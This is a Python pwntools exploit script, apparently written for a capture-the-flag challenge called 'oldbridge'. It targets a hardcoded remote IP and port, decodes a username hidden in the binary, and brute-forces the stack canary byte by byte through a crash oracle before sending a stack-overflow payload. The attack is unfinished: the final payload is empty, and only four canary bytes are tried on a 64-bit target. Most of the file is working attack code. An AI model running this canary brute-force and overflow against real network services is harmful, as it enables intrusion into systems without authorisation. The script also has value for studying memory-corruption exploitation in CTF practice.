#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./exe/oldbridge --host 88.198.233.174 --port 32922
from pwn import *
from session import * # custom module for saving data

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exe/oldbridge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '88.198.233.174'
port = int(args.PORT or 32922)

def local(argv=[], *a, **kw):
    '''Connect to the process on the local host'''
    io = connect("localhost", 1123)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# create session
config = {}
create_session("oldbridge", args.LOCAL)

# username found in binary
config['username'] = ''.join(str(chr(ord(x) ^ 13)) for x in "il{dih")
# buffer size
config['buf_size'] = 1032

# send some string to the server and check if it crashed
# buffer size = 1032
# stack cookie after buffer
# any string > 1032 that does not match the cookie => crash
def check_server(data, padding = False):
    io = start()

    if len(data) > config['buf_size'] - len(config['username']):
        log.error("You are trying to send something too big")
    if padding:
        to_send = config['username'] + cyclic(config['buf_size'] - len(config['username'])) + data
    else:
        to_send = config['username'] + data

    io.sendafter("Username: ", to_send)
    recv_data = io.clean()
    io.close()

    return "Username found!" in recv_data

def brute_force_cookie(logging = False):
    cookie = ""
    for y in range(4):
        if logging:
            log.info("Bruteforcing byte {}".format(y + 1))
        for x in range(0x100):
            temp_cookie = cookie + chr(x)
            if logging:
                log.info("Trying {}".format(hex(x)))

            alive = check_server(temp_cookie, padding = True)
            if alive:
                if logging:
                    log.success("Found byte {}".format(hex(x)))

                cookie = temp_cookie
                break

    if logging:
        if len(cookie) == 4:
            log.success("Got cookie: " + cookie)
        else:
            log.error("Cookie not found")
    return cookie

# load session
if args.LOAD:
    config = load_vars()
    log.info("Load session {}".format(config))

# we need the stack cookie to do a proper exploit
if 'cookie' not in config:
    config['cookie'] = brute_force_cookie(logging = True)

def craft(data):
    return config['username'] + cyclic(config['buf_size'] - len(config['username'])) + config['cookie'] + data

io = start()
io.sendafter("Username: ", craft(cyclic(0)))
data_recv = io.clean()
print (data_recv)

# save the session
save_vars(config)
